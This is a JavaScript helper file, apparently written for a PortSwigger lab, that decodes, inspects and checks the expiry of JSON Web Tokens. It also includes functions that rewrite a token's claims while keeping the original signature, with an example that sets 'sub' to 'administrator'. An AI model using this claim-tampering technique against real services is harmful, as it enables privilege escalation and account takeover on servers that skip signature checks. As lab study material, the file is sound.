// BASE64URL ENCODING/DECODING

/**
 * Encode a string to Base64URL format
 * Base64URL is like Base64 but URL-safe: + becomes -, / becomes _, padding removed
 */
function base64UrlEncode(str) {
  // First convert to regular base64
  const base64 = btoa(str);
  // Then make it URL-safe
  return base64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""); // Remove padding
}

/**
 * Decode a Base64URL string back to regular string
 */
function base64UrlDecode(base64Url) {
  // Convert URL-safe chars back to regular base64
  let base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");

  // Add padding if needed (base64 needs length divisible by 4)
  const padding = base64.length % 4;
  if (padding) {
    base64 += "=".repeat(4 - padding);
  }

  return atob(base64);
}

// JWT PARSING FUNCTIONS

/**
 * Split a JWT into its three parts
 * Returns: { header: string, payload: string, signature: string }
 */
function splitJWT(token) {
  const parts = token.split(".");

  if (parts.length !== 3) {
    throw new Error(`Invalid JWT: expected 3 parts, got ${parts.length}`);
  }

  return {
    header: parts[0],
    payload: parts[1],
    signature: parts[2],
  };
}

/**
 * Decode the header part of a JWT
 * Returns the header as a JavaScript object
 */
function decodeHeader(token) {
  const { header } = splitJWT(token);
  const decoded = base64UrlDecode(header);
  return JSON.parse(decoded);
}

/**
 * Decode the payload part of a JWT
 * Returns the payload (claims) as a JavaScript object
 */
function decodePayload(token) {
  const { payload } = splitJWT(token);
  const decoded = base64UrlDecode(payload);
  return JSON.parse(decoded);
}

/**
 * Get the raw signature (still base64url encoded)
 */
function getSignature(token) {
  const { signature } = splitJWT(token);
  return signature;
}

/**
 * Fully decode a JWT into all its parts
 * Returns: { header: object, payload: object, signature: string, raw: object }
 */
function decodeJWT(token) {
  const parts = splitJWT(token);

  return {
    header: JSON.parse(base64UrlDecode(parts.header)),
    payload: JSON.parse(base64UrlDecode(parts.payload)),
    signature: parts.signature,
    raw: {
      header: parts.header,
      payload: parts.payload,
      signature: parts.signature,
    },
  };
}

// JWT CREATION FUNCTIONS

/**
 * Encode a header object to Base64URL
 */
function encodeHeader(headerObj) {
  const json = JSON.stringify(headerObj);
  return base64UrlEncode(json);
}

/**
 * Encode a payload object to Base64URL
 */
function encodePayload(payloadObj) {
  const json = JSON.stringify(payloadObj);
  return base64UrlEncode(json);
}

/**
 * Assemble JWT parts into a complete token string
 * NOTE: This does NOT create a valid signature - for educational use only!
 */
function assembleJWT(encodedHeader, encodedPayload, signature) {
  return `${encodedHeader}.${encodedPayload}.${signature}`;
}

/**
 * Create a new JWT from header and payload objects, keeping the original signature
 * This demonstrates the vulnerability: if the server doesn't verify signatures,
 * you can modify the payload and keep the old signature!
 */
function createModifiedJWT(headerObj, payloadObj, originalSignature) {
  const encodedHeader = encodeHeader(headerObj);
  const encodedPayload = encodePayload(payloadObj);
  return assembleJWT(encodedHeader, encodedPayload, originalSignature);
}

// HELPER FUNCTIONS FOR THE LAB

/**
 * Pretty print a JWT with all its decoded parts
 */
function inspectJWT(token) {
  try {
    const decoded = decodeJWT(token);

    console.log("=== JWT INSPECTION ===\n");
    console.log("HEADER:");
    console.log(JSON.stringify(decoded.header, null, 2));
    console.log("\nPAYLOAD:");
    console.log(JSON.stringify(decoded.payload, null, 2));
    console.log("\nSIGNATURE (base64url):");
    console.log(decoded.signature);
    console.log("\n=== RAW PARTS ===");
    console.log("Header:", decoded.raw.header);
    console.log("Payload:", decoded.raw.payload);

    return decoded;
  } catch (error) {
    console.error("Failed to decode JWT:", error.message);
    return null;
  }
}

/**
 * Modify a specific claim in the payload and return a new JWT
 * Keeps the original header and signature (demonstrates the vulnerability!)
 */
function modifyClaim(token, claimName, newValue) {
  const decoded = decodeJWT(token);

  // Modify the claim
  decoded.payload[claimName] = newValue;

  // Create new JWT with modified payload but same signature
  const newToken = createModifiedJWT(
    decoded.header,
    decoded.payload,
    decoded.signature,
  );

  console.log(`Modified '${claimName}' to '${newValue}'`);
  console.log("New token:", newToken);

  return newToken;
}

/**
 * Convert Unix timestamp to readable date
 * Useful for reading exp, iat, nbf claims
 */
function timestampToDate(timestamp) {
  return new Date(timestamp * 1000).toISOString();
}

/**
 * Check if a JWT is expired (based on 'exp' claim)
 */
function isExpired(token) {
  const { payload } = decodeJWT(token);

  if (!payload.exp) {
    return { expired: false, message: "No expiration claim (exp) found" };
  }

  const now = Math.floor(Date.now() / 1000);
  const expired = payload.exp < now;

  return {
    expired,
    expiresAt: timestampToDate(payload.exp),
    message: expired ? "Token is EXPIRED" : "Token is still valid",
  };
}

// EXPORTS (for use in Node.js)

// For Node.js environments
if (typeof module !== "undefined" && module.exports) {
  // Node.js doesn't have btoa/atob, so provide them
  if (typeof btoa === "undefined") {
    global.btoa = (str) => Buffer.from(str, "binary").toString("base64");
    global.atob = (str) => Buffer.from(str, "base64").toString("binary");
  }

  module.exports = {
    // Encoding/Decoding
    base64UrlEncode,
    base64UrlDecode,

    // Parsing
    splitJWT,
    decodeHeader,
    decodePayload,
    getSignature,
    decodeJWT,

    // Creation
    encodeHeader,
    encodePayload,
    assembleJWT,
    createModifiedJWT,

    // Helpers
    inspectJWT,
    modifyClaim,
    timestampToDate,
    isExpired,
  };
}

// -- EXAMPLES --

// Example JWT from the GeeksforGeeks article
const exampleToken =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNzA4MzQ1MTIzLCJleHAiOjE3MDgzNTUxMjN9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

// Inspect the token
inspectJWT(exampleToken);

// Modify the 'sub' claim (like in the PortSwigger lab)
const modifiedToken = modifyClaim(exampleToken, "sub", "administrator");

console.log("\nmodifiedToken", modifiedToken, inspectJWT(modifiedToken), "\n");

// Check expiration
console.log(isExpired(exampleToken));
